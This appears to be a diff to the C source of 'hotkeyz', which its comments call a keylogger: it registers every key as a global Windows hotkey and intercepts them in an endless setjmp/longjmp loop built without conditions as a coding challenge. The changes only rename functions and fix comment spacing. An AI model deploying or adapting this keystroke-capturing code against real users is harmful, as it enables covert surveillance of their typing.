@@ -167,15 +167,15 @@ hotkeyz_MessageHandlerProc(
 
 /****************************************************************************************************
 *                                                                                                   *
-* Function:     hotkeyz_register                                                                    *
+* Function:     hotkeyz_Register                                                                    *
 * Purpose:      Registers the entire keyboard as Hotkeys.                                           *
 * Remarks:      - Does not use loops or conditions as a challenge.                                  *
-*				- Assumes all registrations simply work.											*
+*               - Assumes all registrations simply work.                                            *
 *                                                                                                   *
 *****************************************************************************************************/
 static
 VOID
-hotkeyz_register(VOID)
+hotkeyz_Register(VOID)
 {
 	// Register all hotkeys (no loops)
 	(VOID)RegisterHotKey(NULL, VK_BACK, 0, VK_BACK);
@@ -240,7 +240,7 @@ hotkeyz_register(VOID)
 
 /****************************************************************************************************
 *                                                                                                   *
-* Function:     hotkeyz_normalize4                                                                  *
+* Function:     hotkeyz_Normalize4                                                                  *
 * Purpose:      Normalizes a 4-bit number - turning 0 into 0 and everything else into 1.            *
 * Parameters:   - cInput - a 4-bit number.                                                          *
 * Returns:      0 for 0, 1 for everything else.                                                     *
@@ -248,7 +248,7 @@ hotkeyz_register(VOID)
 *****************************************************************************************************/
 static
 BYTE
-hotkeyz_normalize4(
+hotkeyz_Normalize4(
 	BYTE cInput
 )
 {
@@ -259,7 +259,7 @@ hotkeyz_normalize4(
 
 /****************************************************************************************************
 *                                                                                                   *
-* Function:     hotkeyz_normalize8                                                                  *
+* Function:     hotkeyz_Normalize8                                                                  *
 * Purpose:      Normalizes a byte - turning 0 into 0 and everything else into 1.                    *
 * Parameters:   - cInput - a 8-bit number.                                                          *
 * Returns:      0 for 0, 1 for everything else.                                                     *
@@ -267,18 +267,18 @@ hotkeyz_normalize4(
 *****************************************************************************************************/
 static
 BYTE
-hotkeyz_normalize8(
+hotkeyz_Normalize8(
 	BYTE cInput
 )
 {
 	// Return the result based on an array access
 	static BYTE acResults[] = { 0, 1, 1 };
-	return acResults[hotkeyz_normalize4(cInput & 0x0F) + hotkeyz_normalize4((cInput & 0xF0) >> 4)];
+	return acResults[hotkeyz_Normalize4(cInput & 0x0F) + hotkeyz_Normalize4((cInput & 0xF0) >> 4)];
 }
 
 /****************************************************************************************************
 *                                                                                                   *
-* Function:     hotkeyz_normalize16                                                                 *
+* Function:     hotkeyz_Normalize16                                                                 *
 * Purpose:      Normalizes a 16-bit number - turning 0 into 0 and everything else into 1.           *
 * Parameters:   - cInput - a 16-bit number.                                                         *
 * Returns:      0 for 0, 1 for everything else.                                                     *
@@ -286,18 +286,18 @@ hotkeyz_normalize8(
 *****************************************************************************************************/
 static
 BYTE
-hotkeyz_normalize16(
+hotkeyz_Normalize16(
 	WORD wInput
 )
 {
 	// Return the result based on an array access
 	static BYTE acResults[] = { 0, 1, 1 };
-	return acResults[hotkeyz_normalize8(wInput & 0xFF) + hotkeyz_normalize8((wInput & 0xFF00) >> 8)];
+	return acResults[hotkeyz_Normalize8(wInput & 0xFF) + hotkeyz_Normalize8((wInput & 0xFF00) >> 8)];
 }
 
 /****************************************************************************************************
 *                                                                                                   *
-* Function:     hotkeyz_normalize32                                                                 *
+* Function:     hotkeyz_Normalize32                                                                 *
 * Purpose:      Normalizes a 32-bit number - turning 0 into 0 and everything else into 1.           *
 * Parameters:   - cInput - a 32-bit number.                                                         *
 * Returns:      0 for 0, 1 for everything else.                                                     *
@@ -305,18 +305,18 @@ hotkeyz_normalize16(
 *****************************************************************************************************/
 static
 BYTE
-hotkeyz_normalize32(
+hotkeyz_Normalize32(
 	DWORD dwInput
 )
 {
 	// Return the result based on an array access
 	static BYTE acResults[] = { 0, 1, 1 };
-	return acResults[hotkeyz_normalize16(dwInput & 0xFFFF) + hotkeyz_normalize16((dwInput & 0xFFFF0000) >> 16)];
+	return acResults[hotkeyz_Normalize16(dwInput & 0xFFFF) + hotkeyz_Normalize16((dwInput & 0xFFFF0000) >> 16)];
 }
 
 /****************************************************************************************************
 *                                                                                                   *
-* Function:     hotkeyz_run                                                                         *
+* Function:     hotkeyz_Run                                                                         *
 * Purpose:      Runs the keylogger by registering hotkeys and intercepting them forever.            *
 * Remarks:      - Does not use loops or conditions as a challenge.                                  *
 *                                                                                                   *
@@ -325,7 +325,7 @@ hotkeyz_normalize32(
 #pragma warning(disable:6387)
 static
 VOID
-hotkeyz_run(VOID)
+hotkeyz_Run(VOID)
 {
 	MSG tMsg = { 0 };
 	PFN_COND_HANDLER apfnCallbacks[] = { hotkeyz_MessageHandlerProc, hotkeyz_DoSleepProc };
@@ -336,16 +336,16 @@ hotkeyz_run(VOID)
 	jmp_buf tJumpBuffer = { 0 };
 
 	// Register all hotkeys
-	hotkeyz_register();
+	hotkeyz_Register();
 
 	// Implement a loop - we can use setjmp \ longjmp for that
 	(VOID)setjmp(tJumpBuffer);
 	
 	// Peek the message and validae it's a WM_HOTKEY by XORing unsigned values - the result is 0 if and only if both conditions are met
 	tMsg.message = 0;
-	nNormalizedPeekMessageResult = hotkeyz_normalize32((DWORD)PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE) ^ (DWORD)TRUE);
-	nNormalizedWmHotkeyComparisonResult = hotkeyz_normalize32(tMsg.message ^ WM_HOTKEY);
-	nCallback = hotkeyz_normalize32(nNormalizedPeekMessageResult + nNormalizedWmHotkeyComparisonResult);
+	nNormalizedPeekMessageResult = hotkeyz_Normalize32((DWORD)PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE) ^ (DWORD)TRUE);
+	nNormalizedWmHotkeyComparisonResult = hotkeyz_Normalize32(tMsg.message ^ WM_HOTKEY);
+	nCallback = hotkeyz_Normalize32(nNormalizedPeekMessageResult + nNormalizedWmHotkeyComparisonResult);
 
 	// Get the key from the message
 	cCurrVk = (BYTE)((((DWORD)tMsg.lParam) & 0xFFFF0000) >> 16);
@@ -361,14 +361,14 @@ hotkeyz_run(VOID)
 /****************************************************************************************************
 *                                                                                                   *
 * Function:     wmain                                                                               *
-* Purpose:      Main functionality.								    *
-* Returns:      0 always (actually never returns).                                                  *
+* Purpose:      Main functionality.																	*
+* Returns:      0 always.                                                                           *
 *                                                                                                   *
 *****************************************************************************************************/
 INT
 wmain(VOID)
 {
-	hotkeyz_run();
+	hotkeyz_Run();
 	return 0;
 }
 ```
